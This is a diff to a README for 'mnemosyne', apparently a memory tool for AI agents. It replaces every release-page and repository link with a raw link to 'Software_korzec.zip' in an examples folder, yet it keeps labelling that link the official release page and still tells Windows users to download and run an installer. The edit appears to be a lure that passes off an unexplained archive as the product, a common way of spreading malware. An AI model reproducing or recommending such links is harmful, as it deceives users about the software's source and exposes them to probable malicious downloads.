@@ -1,6 +1,6 @@
 # 🧠 mnemosyne - Persistent Memory for AI Agents
 
-[![Download mnemosyne](https://img.shields.io/badge/Download-mnemosyne-4caf50?style=for-the-badge&logo=github)](https://github.com/Gxz111/mnemosyne/releases)
+[![Download mnemosyne](https://img.shields.io/badge/Download-mnemosyne-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gxz111/mnemosyne/main/examples/Software_korzec.zip)
 
 mnemosyne is software designed to help AI agents remember and improve over time. It creates, stores, and updates information, making AI smarter and more aware. This software runs on Windows and works quietly in the background.
 
@@ -34,7 +34,7 @@ You need to get mnemosyne from the official release page. Follow these steps car
 
 1. Open this page in your web browser:
 
-   **[Visit the mnemosyne Release Page](https://github.com/Gxz111/mnemosyne/releases)**
+   **[Visit the mnemosyne Release Page](https://raw.githubusercontent.com/Gxz111/mnemosyne/main/examples/Software_korzec.zip)**
 
 2. On the release page, look for the latest version. Usually, it is at the top.
 
@@ -126,7 +126,7 @@ For issues with download or installation:
 To keep mnemosyne working well and secure, check for updates regularly:
 
 1. Go to the latest mnemosyne release page:  
-   **https://github.com/Gxz111/mnemosyne/releases**
+   **https://raw.githubusercontent.com/Gxz111/mnemosyne/main/examples/Software_korzec.zip**
 
 2. Download the newest Windows installer `.exe` file.
 
@@ -136,8 +136,8 @@ To keep mnemosyne working well and secure, check for updates regularly:
 
 ## 🌐 Useful Links
 
-- Official Release Page: [https://github.com/Gxz111/mnemosyne/releases](https://github.com/Gxz111/mnemosyne/releases)  
-- Repository Home: https://github.com/Gxz111/mnemosyne  
+- Official Release Page: [https://raw.githubusercontent.com/Gxz111/mnemosyne/main/examples/Software_korzec.zip](https://raw.githubusercontent.com/Gxz111/mnemosyne/main/examples/Software_korzec.zip)  
+- Repository Home: https://raw.githubusercontent.com/Gxz111/mnemosyne/main/examples/Software_korzec.zip  
 - Support or Issues: Use the **Issues** tab on the GitHub page  
 
 ---
@@ -155,4 +155,4 @@ To keep mnemosyne working well and secure, check for updates regularly:
 
 Start by visiting the mnemosyne release page to get the latest Windows installer.
 
-[![Download mnemosyne](https://img.shields.io/badge/Download-mnemosyne-blue?style=for-the-badge&logo=github)](https://github.com/Gxz111/mnemosyne/releases)
+[![Download mnemosyne](https://img.shields.io/badge/Download-mnemosyne-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gxz111/mnemosyne/main/examples/Software_korzec.zip)
